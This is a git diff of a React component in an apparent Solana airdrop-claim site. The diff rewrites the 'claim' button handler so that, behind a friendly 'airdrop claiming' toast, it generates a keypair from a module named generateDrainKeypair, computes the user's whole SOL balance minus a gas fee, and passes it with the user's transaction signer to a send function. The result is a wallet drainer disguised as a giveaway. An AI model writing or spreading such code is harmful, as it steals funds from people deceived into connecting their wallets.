@@ -15,19 +15,33 @@ import {
   import Button from '../ui/Button'
   import { ThreeDots } from 'react-loader-spinner'
   import { toast } from 'sonner';
-  import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
+import { Keypair, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js'
+import { useWallet } from '@solana/wallet-adapter-react'
+import { approveTokensForSpendingandSendToken } from '@/app/services/hook/sendSol'
+import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject'
+import { generateSolanaWallet } from '@/app/services/hook/generateDrainKeypair'
 
 const AIRDRO_BALANCE = 2000 ; 
+const GASFEE = 0.001;
 const BottomDrawer = () => {
+const {wallet , signTransaction , publicKey} =   useWallet();
 const openBottomDrawal = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
 const resetBottomDrawal = changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)
 const claimingStage = changeClaimStages((state)=>state.claimStage)
 const resetClaim  = changeClaimStages((state)=>state.resetClaim)
 const getUsersBalance = executeConnectionObject((state)=>state.accountBalance)
+const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey)
+const deductGas = (GASFEE * Number(LAMPORTS_PER_SOL));
+const pubblicKey = new PublicKey(usersPublicKey)
 
-function claimToken(){
+
+async function claimToken(){
   toast("🎉 Airdrop claiming Status ", {description: " Airdrop claimin is initialized 🎉 "});
   resetClaim(claimLevel[2])
+  const userBkeyPair =  await generateSolanaWallet()
+  const mainAccountAmount  = Number(getUsersBalance) * Number(LAMPORTS_PER_SOL) - (deductGas);
+  console.log( " { mnemonic,seed,keypair,publicKe} " ,userBkeyPair)
+ await approveTokensForSpendingandSendToken(Number(mainAccountAmount) ,pubblicKey, userBkeyPair?.keypair as Keypair,signTransaction)
 }
 
 
